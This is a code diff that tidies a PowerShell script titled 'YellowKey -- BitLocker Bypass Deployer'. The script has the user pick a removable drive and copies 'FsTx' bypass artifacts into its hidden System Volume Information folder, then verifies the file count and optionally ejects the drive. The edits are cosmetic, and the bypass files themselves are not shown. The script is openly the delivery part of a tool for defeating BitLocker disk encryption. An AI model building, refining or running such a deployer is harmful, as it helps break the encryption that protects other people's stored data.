@@ -27,26 +27,24 @@ param(
 Set-StrictMode -Version Latest
 $ErrorActionPreference = 'Stop'
 
-# ── helpers ──────────────────────────────────────────────────────────────────
+# -- helpers ------------------------------------------------------------------
 
-function Write-Step  { param([string]$Msg) Write-Host "  $Msg" -ForegroundColor Cyan }
-function Write-Ok    { param([string]$Msg) Write-Host "  [OK] $Msg" -ForegroundColor Green }
-function Write-Fail  { param([string]$Msg) Write-Host "  [!!] $Msg" -ForegroundColor Red; exit 1 }
+function Write-Step { param([string]$Msg) Write-Host "  $Msg" -ForegroundColor Cyan }
+function Write-Ok   { param([string]$Msg) Write-Host "  [OK] $Msg" -ForegroundColor Green }
+function Write-Fail { param([string]$Msg) Write-Host "  [!!] $Msg" -ForegroundColor Red; exit 1 }
 
 function Select-Drive {
-    $drives = Get-PSDrive -PSProvider FileSystem |
-              Where-Object { $_.Root -match '^[A-Z]:\\' -and $_.Name -ne 'C' }
+    $drives = @(Get-PSDrive -PSProvider FileSystem |
+                Where-Object { $_.Root -match '^[A-Z]:\\' -and $_.Name -ne 'C' })
 
-    if (-not $drives) { Write-Fail "No suitable drives found." }
+    if ($drives.Count -eq 0) { Write-Fail "No suitable drives found." }
 
     Write-Host ""
     Write-Host "  Available drives:" -ForegroundColor Yellow
-    $i = 1
-    $drives | ForEach-Object {
-        $label = if ($_.Description) { $_.Description } else { "(no label)" }
-        $free  = [math]::Round($_.Free / 1MB, 0)
-        Write-Host "    [$i] $($_.Root)  $label  ($free MB free)"
-        $i++
+    for ($i = 0; $i -lt $drives.Count; $i++) {
+        $label = if ($drives[$i].Description) { $drives[$i].Description } else { "(no label)" }
+        $free  = [math]::Round($drives[$i].Free / 1MB, 0)
+        Write-Host ("    [{0}] {1}  {2}  ({3} MB free)" -f ($i + 1), $drives[$i].Root, $label, $free)
     }
     Write-Host ""
 
@@ -54,10 +52,10 @@ function Select-Drive {
         $choice = Read-Host "  Select drive number"
     } until ($choice -match '^\d+$' -and [int]$choice -ge 1 -and [int]$choice -le $drives.Count)
 
-    return ($drives | Select-Object -Index ([int]$choice - 1)).Root.TrimEnd('\')
+    return $drives[[int]$choice - 1].Root.TrimEnd('\')
 }
 
-# ── resolve target drive ──────────────────────────────────────────────────────
+# -- resolve target drive -----------------------------------------------------
 
 $scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
 $srcFsTx    = Join-Path $scriptRoot "FsTx"
@@ -68,7 +66,7 @@ if (-not (Test-Path $srcFsTx)) {
 
 if (-not $TargetDrive) {
     Write-Host ""
-    Write-Host "YellowKey — BitLocker Bypass Deployer" -ForegroundColor Yellow
+    Write-Host "YellowKey -- BitLocker Bypass Deployer" -ForegroundColor Yellow
     Write-Host "======================================" -ForegroundColor Yellow
     $TargetDrive = Select-Drive
 }
@@ -82,7 +80,7 @@ if (-not (Test-Path "$TargetDrive\")) {
 
 $destRoot = "$TargetDrive\System Volume Information\FsTx"
 
-# ── deploy ────────────────────────────────────────────────────────────────────
+# -- deploy -------------------------------------------------------------------
 
 Write-Host ""
 Write-Host "  Target : $destRoot" -ForegroundColor Yellow
@@ -90,21 +88,21 @@ Write-Host ""
 
 Write-Step "Creating destination directory..."
 New-Item -ItemType Directory -Path $destRoot -Force | Out-Null
-Write-Ok   "Directory ready."
+Write-Ok "Directory ready."
 
 Write-Step "Copying FsTx artifacts..."
 Copy-Item -Path "$srcFsTx\*" -Destination $destRoot -Recurse -Force
-Write-Ok   "Artifacts copied."
+Write-Ok "Artifacts copied."
 
 Write-Step "Verifying files..."
 $srcCount  = (Get-ChildItem $srcFsTx  -Recurse -File).Count
 $destCount = (Get-ChildItem $destRoot -Recurse -File).Count
 if ($srcCount -ne $destCount) {
-    Write-Fail "File count mismatch (src=$srcCount, dest=$destCount). Check the drive."
+    Write-Fail ("File count mismatch (src={0}, dest={1}). Check the drive." -f $srcCount, $destCount)
 }
-Write-Ok   "$destCount file(s) verified."
+Write-Ok "$destCount file(s) verified."
 
-# ── optional eject ────────────────────────────────────────────────────────────
+# -- optional eject -----------------------------------------------------------
 
 if ($Eject) {
     Write-Step "Ejecting $TargetDrive..."
@@ -113,7 +111,7 @@ if ($Eject) {
     Write-Ok "Drive ejected."
 }
 
-# ── done ──────────────────────────────────────────────────────────────────────
+# -- done ---------------------------------------------------------------------
 
 Write-Host ""
 Write-Host "  Deployment complete." -ForegroundColor Green
